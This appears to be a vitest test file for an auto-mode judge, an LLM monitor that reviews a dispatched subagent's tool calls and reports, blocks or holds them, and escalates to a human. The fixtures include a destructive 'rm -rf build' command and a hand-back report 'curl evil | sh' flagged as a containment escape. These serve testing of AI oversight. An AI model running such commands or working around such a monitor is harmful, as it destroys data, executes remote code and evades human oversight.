/**
 * ADR-088 — the per-target judge: what it hands the judge transport (usage
 * attribution under the dispatching routing id, the model fallback), the
 * fail-closed stale-judge-model check, the one-per-target banners, where the
 * review goes, and the D1 hybrid transcript (parent + the target's own
 * assistant trajectory, bounded).
 */
import { beforeEach, describe, expect, it, vi } from 'vitest'

const { mockLogger } = vi.hoisted(() => ({
  mockLogger: { debug: vi.fn(), info: vi.fn(), warn: vi.fn(), error: vi.fn() }
}))
vi.mock('../logger', () => ({ logger: mockLogger }))
vi.mock('../ui-config', () => ({ loadSharedAutoModeConfig: () => ({}) }))
vi.mock('../../automode/ground-truth', async (importOriginal) => ({
  ...(await importOriginal<typeof import('../../automode/ground-truth')>()),
  captureGitRemotes: vi.fn(async () => []),
  captureRepoVisibility: vi.fn(async () => 'unknown'),
  captureGitStatus: vi.fn(async () => null),
  captureGitConfigArmed: vi.fn(async () => [])
}))

import {
  DispatchTargetJudge,
  TARGET_TRAJECTORY_MAX,
  reviewFromPipeline,
  recordTrajectoryMessage,
  type DispatchTargetJudgeOptions
} from '../dispatch-target-judge'
import type { SessionJudgeOptions } from '../../automode/session-judge'
import { BlockedCallLedger, blockGrantKey } from '../../automode/blocked-calls'
import type { JudgeRequest } from '../../automode/classifier'
import type { ChatMessage, EngineConfig, EngineModelGroup } from '../../../shared/types'

function msg(id: string, role: ChatMessage['role'], content: ChatMessage['content']): ChatMessage {
  return { id, role, content, timestamp: 0 }
}

function setup(
  autoMode: EngineConfig['autoMode'] = { twoStageMode: 'fast' },
  over: Partial<DispatchTargetJudgeOptions> = {}
) {
  const emit = vi.fn()
  const transportOpts: SessionJudgeOptions[] = []
  const requests: JudgeRequest[] = []
  const replies: Array<string | Error> = []
  const trajectory = new Map<string, ChatMessage>()
  const judge = new DispatchTargetJudge({
    engine: 'opencode',
    cwd: '/repo',
    routingId: 'parent-routing',
    sessionId: () => 'target-session',
    model: () => 'anthropic/target-model',
    emit: () => emit,
    messages: () => [msg('p1', 'user', [{ type: 'text', text: 'please clean the build dir' }])],
    trajectory: () => trajectory.values(),
    subagent: () => ({ type: 'dispatch:opencode', prompt: 'remove build/ and rebuild' }),
    loadEngineConfig: () => ({ autoMode }) as EngineConfig,
    peekModels: () => null,
    makeTransport: (opts) => {
      transportOpts.push(opts)
      return async (req) => {
        requests.push(req)
        const next = replies.shift()
        if (next instanceof Error) throw next
        return next ?? '<block>no</block>'
      }
    },
    ...over
  })
  const call = {
    currentMode: () => 'auto',
    honoursWorkdir: true,
    permissions: () => ({ allow: [], ask: [], deny: [], additionalDirectories: [] })
  }
  return { judge, emit, transportOpts, requests, replies, trajectory, call }
}

const bash = { toolUseId: 'oc-call-7', toolName: 'bash', input: { command: 'rm -rf build' } }

beforeEach(() => vi.clearAllMocks())

describe('DispatchTargetJudge', () => {
  it('builds the transport under the dispatching routing id, with the target session id', async () => {
    const { judge, call, transportOpts } = setup()
    expect(await judge.judge(bash, call)).toEqual({ kind: 'allow' })
    expect(transportOpts).toHaveLength(1)
    const opts = transportOpts[0]
    expect(opts.engine).toBe('opencode')
    expect(opts.routingId).toBe('parent-routing')
    expect(opts.sessionId()).toBe('target-session')
    // No judgeModel configured → the target's own model.
    expect(opts.modelValue()).toBe('anthropic/target-model')
  })

  it("ADR-091 part 6: the dispatching session's grant clears the target's exact call once, in its own cwd only", async () => {
    const ledger = new BlockedCallLedger(() => {})
    const review = {
      type: 'tool_review' as const,
      toolUseId: 'x',
      reviewId: 'r',
      reviewer: 'auto-mode' as const,
      decision: 'denied' as const
    }
    // Approved in the TARGET's cwd: the grant for this target's call.
    ledger.record(
      'x',
      { ...bash, review, grantKey: blockGrantKey('opencode', 'bash', bash.input, '/repo', true) },
      false
    )
    ledger.approve('x')
    const { judge, call, requests } = setup(undefined, { blockedCalls: () => ledger })
    // Same command with a workdir elsewhere: another action — judged.
    await judge.judge({ ...bash, input: { ...bash.input, workdir: '/elsewhere' } }, call)
    expect(requests).toHaveLength(1)
    expect(await judge.judge(bash, call)).toEqual({ kind: 'allow' })
    expect(requests).toHaveLength(1)
    await judge.judge(bash, call)
    expect(requests).toHaveLength(2)
  })

  it('modelValue is the TARGET engine’s autoMode.judgeModel when set', async () => {
    const { judge, call, transportOpts } = setup({ twoStageMode: 'fast', judgeModel: 'x/judge' })
    await judge.judge(bash, call)
    expect(transportOpts[0].modelValue()).toBe('x/judge')
  })

  it('autoModeActive follows the target engine’s switch', () => {
    expect(setup().judge.autoModeActive('auto')).toBe(true)
    expect(setup().judge.autoModeActive('full')).toBe(true)
    expect(setup().judge.autoModeActive('default')).toBe(false)
    expect(setup({ enabled: false }).judge.autoModeActive('auto')).toBe(false)
  })

  it('a stale configured judge model → human, zero judge calls, ONE banner per target', async () => {
    const groups: EngineModelGroup[] = [
      {
        engineId: 'opencode',
        vendorId: 'anthropic' as EngineModelGroup['vendorId'],
        vendorName: 'A',
        models: [{ value: 'x/other', displayName: 'other', description: '' }]
      }
    ]
    const { judge, call, emit, requests } = setup(
      { twoStageMode: 'fast', judgeModel: 'x/gone' },
      { peekModels: () => groups }
    )
    expect(await judge.judge(bash, call)).toEqual({ kind: 'human' })
    expect(await judge.judge(bash, call)).toEqual({ kind: 'human' })
    expect(requests).toHaveLength(0)
    const errors = emit.mock.calls.filter((c) => c[0] === 'session:error')
    expect(errors).toHaveLength(1)
    expect(errors[0][1]).toContain('Auto-mode judge model "x/gone" is no longer available')
    expect(errors[0][1]).toContain('Auto-mode judge (opencode)')
  })

  it('a listed or uncatalogued judge model is available', () => {
    expect(setup({ judgeModel: 'x/j' }).judge.judgeAvailable()).toBe(true)
    const listed = setup(
      { judgeModel: 'x/j' },
      {
        peekModels: () => [
          {
            engineId: 'opencode',
            vendorId: 'anthropic' as EngineModelGroup['vendorId'],
            vendorName: 'A',
            models: [{ value: 'x/j', displayName: 'j', description: '' }]
          }
        ]
      }
    )
    expect(listed.judge.judgeAvailable()).toBe(true)
  })

  it('a route-unavailable judge says so ONCE per target', async () => {
    const { judge, call, emit, transportOpts } = setup()
    await judge.judge(bash, call)
    transportOpts[0].onUnavailable('no route')
    transportOpts[0].onUnavailable('no route')
    const errors = emit.mock.calls.filter((c) => c[0] === 'session:error')
    expect(errors).toHaveLength(1)
    expect(errors[0][1]).toContain('no route')
  })

  it('emits the review under emit() with the NESTED tool id', async () => {
    const { judge, call, emit } = setup()
    await judge.judge(bash, call)
    const reviews = emit.mock.calls.filter((c) => c[0] === 'session:tool-review')
    expect(reviews).toHaveLength(1)
    expect(reviews[0][1]).toMatchObject({
      toolUseId: 'oc-call-7',
      review: { toolUseId: 'oc-call-7', reviewer: 'auto-mode', decision: 'approved' }
    })
  })

  it('a block holds (ADR-091 §3); the call is annotated only once the hold is kept', async () => {
    const { judge, call, replies, requests, trajectory } = setup()
    recordTrajectoryMessage(
      trajectory,
      msg('a1', 'assistant', [
        { type: 'tool_use', toolUseId: 'oc-call-7', toolName: 'bash', toolInput: bash.input }
      ])
    )
    replies.push('<block>yes</block><reason>destroys the build</reason>')
    expect(await judge.judge(bash, call)).toEqual({
      kind: 'hold',
      reason: 'Auto mode blocked: destroys the build',
      // The review it sent rides along (ADR-091 part 6).
      review: expect.objectContaining({ toolUseId: 'oc-call-7', decision: 'denied' })
    })
    // Still held: nothing refused it yet.
    await judge.judge({ ...bash, toolUseId: 'oc-call-8' }, call)
    expect(requests[1].user).not.toContain('automode-blocked')
    // Kept (the dispatcher's resolveApproval records it).
    judge.recordOutcome('oc-call-7', 'automode-blocked')
    await judge.judge({ ...bash, toolUseId: 'oc-call-9' }, call)
    expect(requests[2].user).toContain('automode-blocked')
  })

  it('an approved hold resets the denial streak — the next block holds instead of hitting the cap', async () => {
    const { judge, call, replies } = setup()
    replies.push('<block>yes</block>', '<block>yes</block>', '<block>yes</block>')
    expect((await judge.judge(bash, call)).kind).toBe('hold')
    expect((await judge.judge(bash, call)).kind).toBe('hold')
    judge.recordHoldApproved()
    // Without the reset this would be the 3rd consecutive block → the human.
    expect((await judge.judge(bash, call)).kind).toBe('hold')
  })

  it('D1: the judge reads the parent transcript then the target’s own assistant trajectory — never a target user line', async () => {
    const { judge, call, requests, trajectory } = setup()
    // A user-role target message (the dispatch prompt as the target saw it) never enters.
    recordTrajectoryMessage(
      trajectory,
      msg('t0', 'user', [{ type: 'text', text: 'remove build/ and rebuild' }])
    )
    recordTrajectoryMessage(
      trajectory,
      msg('t1', 'assistant', [
        {
          type: 'tool_use',
          toolUseId: 'earlier',
          toolName: 'bash',
          toolInput: { command: 'ls build' }
        }
      ])
    )
    expect(trajectory.size).toBe(1)
    await judge.judge(bash, call)
    const user = requests[0].user
    expect(user).toContain('User: please clean the build dir')
    expect(user).toContain('ls build')
    expect(user).not.toMatch(/User: remove build\/ and rebuild/)
    // The prompt still reaches the judge — as the subagent header's task.
    expect(user).toContain('"dispatch:opencode" subagent')
    expect(judge.judgeMessages().map((m) => m.id)).toEqual(['p1', 't1'])
  })

  it('ADR-091 §4: parent, queued user turns and the trajectory merge in time order (stable on ties)', async () => {
    const at = (m: ChatMessage, timestamp: number): ChatMessage => ({ ...m, timestamp })
    const { judge, call, requests, trajectory } = setup(undefined, {
      messages: () => [
        at(msg('p1', 'user', [{ type: 'text', text: 'set up the VM' }]), 100),
        at(msg('p2', 'user', [{ type: 'text', text: 'go ahead, push it' }]), 300)
      ],
      queuedTurns: () => [
        at(msg('q1', 'user', [{ type: 'text', text: 'yes, the queued go-ahead' }]), 250)
      ]
    })
    // The child's blocked call (200) precedes the user's later consent (250, 300);
    // a trajectory message tied with a parent one (100) stays after it.
    recordTrajectoryMessage(
      trajectory,
      at(
        msg('t1', 'assistant', [
          { type: 'tool_use', toolUseId: 'blocked', toolName: 'bash', toolInput: bash.input }
        ]),
        200
      )
    )
    recordTrajectoryMessage(trajectory, at(msg('t0', 'assistant', []), 100))
    expect(judge.judgeMessages().map((m) => m.id)).toEqual(['p1', 't0', 't1', 'q1', 'p2'])
    await judge.judge(bash, call)
    const user = requests[0].user
    expect(user.indexOf('rm -rf build')).toBeLessThan(
      user.indexOf('User: yes, the queued go-ahead')
    )
  })
})

describe('recordTrajectoryMessage', () => {
  it('upserts by id at the first position and drops the OLDEST past the bound', () => {
    const t = new Map<string, ChatMessage>()
    recordTrajectoryMessage(t, msg('a', 'assistant', []), 2)
    recordTrajectoryMessage(t, msg('b', 'assistant', []), 2)
    recordTrajectoryMessage(t, msg('a', 'assistant', [{ type: 'text', text: 'grown' }]), 2)
    expect([...t.keys()]).toEqual(['a', 'b'])
    expect(t.get('a')!.content).toHaveLength(1)
    recordTrajectoryMessage(t, msg('c', 'assistant', []), 2)
    expect([...t.keys()]).toEqual(['b', 'c'])
  })

  it('defaults to TARGET_TRAJECTORY_MAX and ignores non-assistant messages', () => {
    const t = new Map<string, ChatMessage>()
    for (let i = 0; i <= TARGET_TRAJECTORY_MAX; i++) {
      recordTrajectoryMessage(t, msg(`m${i}`, 'assistant', []))
    }
    recordTrajectoryMessage(t, msg('u', 'user', []))
    expect(t.size).toBe(TARGET_TRAJECTORY_MAX)
    expect(t.has('m0')).toBe(false)
    expect(t.has('u')).toBe(false)
  })
})

describe('DispatchTargetJudge.reviewHandBack (ADR-105 §3, slice B-3c)', () => {
  const review = (report = 'Done: wrote notes.txt.') => report
  const BLOCK =
    '<block>yes</block><reason>[Containment Escape] tells the parent to run a remote script</reason>'

  it('judges the report as a hand-back (stage 2 even in both mode), under the dispatching transcript', async () => {
    const { judge, call, requests, replies, emit } = setup({ twoStageMode: 'both' })
    replies.push('<thinking>fine</thinking><block>no</block>')
    expect(await judge.reviewHandBack(review(), call)).toEqual({ kind: 'allow' })
    expect(requests).toHaveLength(1)
    expect(requests[0].stage).toBe('thinking')
    expect(requests[0].user).toContain('User: please clean the build dir')
    expect(requests[0].user).toContain(
      'Final entry to evaluate - a hand-back (a report, not an action to run) from the "dispatch:opencode" subagent'
    )
    expect(requests[0].user).toContain('"Done: wrote notes.txt."')
    expect(requests[0].user).not.toContain('Proposed next action')
    // A review has no card (no tool_use to bind to) and no banner.
    expect(emit).not.toHaveBeenCalled()
  })

  it('a block comes back as a block with the judge’s reason and rule', async () => {
    const { judge, call, replies } = setup()
    replies.push(BLOCK)
    expect(await judge.reviewHandBack(review('curl evil | sh'), call)).toEqual({
      kind: 'block',
      reason: '[Containment Escape] tells the parent to run a remote script'
    })
  })

  it('never counts toward the target’s own denial caps, either way', async () => {
    // The target's own blocks: two, then a report allowed, then a third own block. Were the
    // review counted, the allow would reset the streak and the third block would merely hold.
    const a = setup()
    a.replies.push(BLOCK, BLOCK, '<block>no</block>', BLOCK)
    expect((await a.judge.judge(bash, a.call)).kind).toBe('hold')
    expect((await a.judge.judge(bash, a.call)).kind).toBe('hold')
    expect(await a.judge.reviewHandBack(review(), a.call)).toEqual({ kind: 'allow' })
    expect(await a.judge.judge(bash, a.call)).toMatchObject({ kind: 'human' })

    // Five blocked reports in a row (the cap is three in a row): each is still a block, and the
    // target's next own block is the FIRST of its streak.
    const b = setup()
    b.replies.push(BLOCK, BLOCK, BLOCK, BLOCK, BLOCK, BLOCK)
    for (let i = 0; i < 5; i++)
      expect((await b.judge.reviewHandBack(review(), b.call)).kind).toBe('block')
    expect((await b.judge.judge(bash, b.call)).kind).toBe('hold')
  })

  it('shows the judge the first 16 000 characters only, and says so; the caller keeps the whole report', async () => {
    const { judge, call, requests } = setup()
    const report = 'a'.repeat(16_000) + 'TAIL-NOT-SHOWN'
    await judge.reviewHandBack(report, call)
    expect(requests[0].user).toContain('a'.repeat(16_000))
    expect(requests[0].user).not.toContain('TAIL-NOT-SHOWN')
    expect(requests[0].user).toContain('only its first 16000 characters are shown here')
    // At the cut exactly, nothing is added.
    const exact = setup()
    await exact.judge.reviewHandBack('b'.repeat(16_000), exact.call)
    expect(exact.requests[0].user).not.toContain('only its first')
  })

  it('no verdict is "could not review": a transport error, a route with none, an unreadable reply', async () => {
    const down = setup()
    down.replies.push(new Error('HTTP 503'))
    expect(await down.judge.reviewHandBack(review(), down.call)).toEqual({
      kind: 'unavailable',
      why: 'HTTP 503'
    })

    // The route resolver's sentence is the cause, and it is NOT the target's one banner.
    const emit = vi.fn()
    const noRoute = setup(undefined, {
      emit: () => emit,
      makeTransport: (opts) => async () => {
        opts.onUnavailable('"anthropic" is set up inside opencode, not in ClaudeUI.')
        throw new Error('route unavailable')
      }
    })
    expect(await noRoute.judge.reviewHandBack(review(), noRoute.call)).toEqual({
      kind: 'unavailable',
      why: '"anthropic" is set up inside opencode, not in ClaudeUI.'
    })
    expect(emit).not.toHaveBeenCalled()

    const garbled = setup()
    garbled.replies.push('I cannot comply with that.')
    expect(await garbled.judge.reviewHandBack(review(), garbled.call)).toEqual({
      kind: 'unavailable',
      why: "the reviewer's answer could not be read"
    })
  })

  it('auto mode left while it was judged → could not review (the verdict is stale authority)', async () => {
    let mode = 'auto'
    const { judge, call } = setup(undefined, {
      makeTransport: () => async () => {
        mode = 'default'
        return BLOCK
      }
    })
    expect(await judge.reviewHandBack(review(), { ...call, currentMode: () => mode })).toEqual({
      kind: 'unavailable',
      why: 'auto mode was switched off while it was reviewed'
    })
  })

  it('a run stopped meanwhile cancels the verdict; a stale judge model is named; it never throws', async () => {
    const stopped = setup()
    stopped.replies.push(BLOCK)
    expect(
      await stopped.judge.reviewHandBack(review(), { ...stopped.call, stillPending: () => false })
    ).toEqual({ kind: 'unavailable', why: 'the review was cancelled' })

    const groups: EngineModelGroup[] = [
      {
        engineId: 'opencode',
        vendorId: 'anthropic' as EngineModelGroup['vendorId'],
        vendorName: 'A',
        models: [{ value: 'x/other', displayName: 'o', description: '' }]
      }
    ]
    const stale = setup(
      { twoStageMode: 'fast', judgeModel: 'x/gone' },
      { peekModels: () => groups }
    )
    expect(await stale.judge.reviewHandBack(review(), stale.call)).toEqual({
      kind: 'unavailable',
      why: 'the configured judge model is no longer available'
    })

    const broken = setup(undefined, {
      messages: () => {
        throw new Error('transcript unreadable')
      }
    })
    expect(await broken.judge.reviewHandBack(review(), broken.call)).toMatchObject({
      kind: 'unavailable'
    })
  })

  it('a Codex target’s report goes through pi’s route on the target’s own model, under the Codex engine’s switches', async () => {
    const asked: string[] = []
    const { judge, call, transportOpts, replies } = setup(
      { twoStageMode: 'fast', judgeModel: 'someone-elses/judge', enabled: true },
      {
        engine: 'pi',
        configEngine: 'codex',
        fixedModel: () => 'gpt-5.4',
        model: () => 'gpt-5.4',
        sessionId: () => null,
        loadEngineConfig: (id: string) => {
          asked.push(id)
          return {
            autoMode: { twoStageMode: 'fast', judgeModel: 'someone-elses/judge' }
          } as EngineConfig
        }
      }
    )
    replies.push('<block>no</block>')
    expect(await judge.reviewHandBack(review(), call)).toEqual({ kind: 'allow' })
    expect(asked).toEqual(['codex'])
    expect(transportOpts[0].engine).toBe('pi')
    // The target's own model — never another engine's configured judge model.
    expect(transportOpts[0].modelValue()).toBe('gpt-5.4')
    // No Codex thread id is passed off as a pi session on the usage row.
    expect(transportOpts[0].sessionId()).toBeNull()
  })

  it('the caller’s signal reaches the transport request: aborting it aborts the request in flight', async () => {
    const stop = new AbortController()
    const { judge, call, requests, replies } = setup({ twoStageMode: 'both' })
    replies.push('<block>no</block>')
    await judge.reviewHandBack(review(), { ...call, signal: stop.signal })
    const sent = requests[0].signal!
    expect(sent.aborted).toBe(false)
    stop.abort()
    expect(sent.aborted).toBe(true)
  })

  it('without a caller signal the request carries the stage’s signal untouched', async () => {
    const { judge, call, requests, replies } = setup({ twoStageMode: 'both' })
    replies.push('<block>no</block>')
    await judge.reviewHandBack(review(), call)
    expect(requests[0].signal).toBeInstanceOf(AbortSignal)
    expect(requests[0].signal!.aborted).toBe(false)
  })
})

describe('reviewFromPipeline', () => {
  it('maps every pipeline detail to a review', () => {
    expect(
      reviewFromPipeline({ kind: 'verdict', result: { block: false, stage: 'fast' } })
    ).toEqual({
      kind: 'allow'
    })
    expect(
      reviewFromPipeline({
        kind: 'verdict',
        result: { block: true, stage: 'thinking', reason: 'no', category: 'git_destructive' }
      })
    ).toMatchObject({ kind: 'block', reason: expect.stringContaining('no') })
    // A capped block still stands as a block (the throwaway tracker never caps, but the mapping holds).
    expect(
      reviewFromPipeline({
        kind: 'verdict',
        result: { block: true, stage: 'thinking', reason: 'no' },
        capped: 'cap'
      })
    ).toEqual({ kind: 'block', reason: 'no' })
    expect(reviewFromPipeline({ kind: 'none' })).toEqual({
      kind: 'unavailable',
      why: 'the review was cancelled'
    })
    expect(reviewFromPipeline({ kind: 'unavailable', cause: 'judge' })).toEqual({
      kind: 'unavailable',
      why: 'the reviewer gave no answer'
    })
  })
})
